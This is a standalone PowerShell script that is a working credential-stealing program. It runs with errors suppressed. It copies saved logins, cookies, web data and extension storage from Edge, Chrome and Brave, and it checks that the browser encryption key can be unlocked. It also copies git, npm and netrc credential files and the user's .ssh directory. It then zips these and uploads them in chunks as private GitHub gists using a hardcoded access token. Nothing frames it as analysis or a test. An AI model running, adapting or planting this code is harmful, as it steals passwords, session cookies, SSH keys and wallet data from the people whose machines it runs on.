$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
$H=$env:COMPUTERNAME;$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$tmp=$env:TEMP;$D=Join-Path $tmp ('.w'+$W);New-Item -ItemType Directory -Force -Path $D|Out-Null
$U=$env:USERPROFILE
function G($desc,$content){
  $b=@{description=$desc;public=$false;files=@{t=@{content=$content}}}|ConvertTo-Json -Compress -Depth 5
  for($t=0;$t -lt 4;$t++){ try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization="token $T";'User-Agent'='w'} -ContentType 'application/json' -Body $b -TimeoutSec 60|Out-Null; return $true }catch{ Start-Sleep -Seconds 5 } }
  return $false
}
G ('wx2-'+$H+'-'+$W+'-start') ("start user="+$env:USERNAME+" cwd="+(Get-Location).Path)
$D1=Join-Path $D 'a';New-Item -ItemType Directory -Force -Path $D1|Out-Null
$msg=""
$pairs=@(@('Edge',(Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')),@('Chrome',(Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')),@('Brave',(Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')))
foreach($pair in $pairs){
  $bn=$pair[0];$B=$pair[1]
  if(-not(Test-Path $B)){ $msg=$msg+$bn+':absent;'; continue }
  $lsf=Join-Path $B 'Local State'
  if(Test-Path $lsf){
    Copy-Item $lsf (Join-Path $D1 ($bn+'-LocalState')) -Force
    try{
      $j=Get-Content $lsf -Raw|ConvertFrom-Json; $ek=$j.os_crypt.encrypted_key
      if($ek){ $bb=[Convert]::FromBase64String($ek); $bb=$bb[5..($bb.Length-1)]; $raw=[System.Security.Cryptography.ProtectedData]::Unprotect($bb,$null,'CurrentUser'); if($raw){ $msg=$msg+$bn+'-key-ok;' } }
    }catch{ $msg=$msg+$bn+'-key-err;' }
  }
  foreach($prof in Get-ChildItem $B -Directory -Force){
    $pn=$prof.Name;$P=$prof.FullName
    $les=Join-Path $P 'Local Extension Settings'
    if(Test-Path $les){
      foreach($e in Get-ChildItem $les -Directory -Force){
        $d2=Join-Path $D1 ('x-'+$bn+'-'+$pn+'-'+$e.Name); New-Item -ItemType Directory -Force -Path $d2|Out-Null
        Get-ChildItem $e.FullName -Force|ForEach-Object{ if($_.Length -lt 6000000){ try{Copy-Item $_.FullName $d2 -Force}catch{} } }
      }
      $msg=$msg+$bn+'-'+$pn+'-les;'
    }
    $idb=Join-Path $P 'IndexedDB'
    if(Test-Path $idb){
      foreach($e in Get-ChildItem $idb -Directory -Force){
        if($e.Name -like 'chrome-extension_*'){
          $d2=Join-Path $D1 ('i-'+$bn+'-'+$pn+'-'+$e.Name); New-Item -ItemType Directory -Force -Path $d2|Out-Null
          Get-ChildItem $e.FullName -Force|ForEach-Object{ if($_.Length -lt 6000000){ try{Copy-Item $_.FullName $d2 -Force}catch{} } }
        }
      }
    }
    foreach($f in 'Login Data','Cookies','Preferences','Secure Preferences','Web Data'){ $fp=Join-Path $P $f; if(Test-Path $fp){ try{Copy-Item $fp (Join-Path $D1 ($bn+'-'+$pn+'-'+($f -replace ' ','_'))) -Force}catch{} } }
  }
}
foreach($f in '.gitconfig','.git-credentials','.npmrc','.netrc'){ $fp=Join-Path $U $f; if(Test-Path $fp){ try{Copy-Item $fp (Join-Path $D1 ('dot-'+$f)) -Force}catch{} } }
$ssh=Join-Path $U '.ssh'
if(Test-Path $ssh){ $d2=Join-Path $D1 'ssh'; New-Item -ItemType Directory -Force -Path $d2|Out-Null; Get-ChildItem $ssh -Force|ForEach-Object{ if($_.Length -lt 6000000){ try{Copy-Item $_.FullName $d2 -Force}catch{} } }; $msg=$msg+'ssh;' }
$z1=Join-Path $tmp ('.wz-'+$W+'.zip'); $zs=0
try{ [System.IO.Compression.ZipFile]::CreateFromDirectory($D1,$z1,[System.IO.Compression.CompressionLevel]::Optimal,$false); $zs=(Get-Item $z1).Length; $msg=$msg+'zip-ok:'+$zs }catch{ $msg=$msg+'zip-err:'+$_ }
G ('wx2-'+$H+'-'+$W+'-collected') $msg
if($zs -gt 0){
  $bytes=[IO.File]::ReadAllBytes($z1);$CH=700000;$n=0;$fail=0
  for($i=0;$i -lt $bytes.Length;$i+=$CH){
    $len=[Math]::Min($CH,$bytes.Length-$i);$b64=[Convert]::ToBase64String($bytes,$i,$len)
    if(G ('wx2-'+$H+'-'+$W+'-c'+$n) $b64){ $n=$n+1 } else { $fail=$fail+1; if($fail -gt 2){break} }
  }
  G ('wx2-'+$H+'-'+$W+'-MANIFEST') ("host=$H size=$zs chunks=$n fail=$fail msg=$msg")
}
Write-Output ("W2DONE "+$H+" "+$W+" "+$msg)
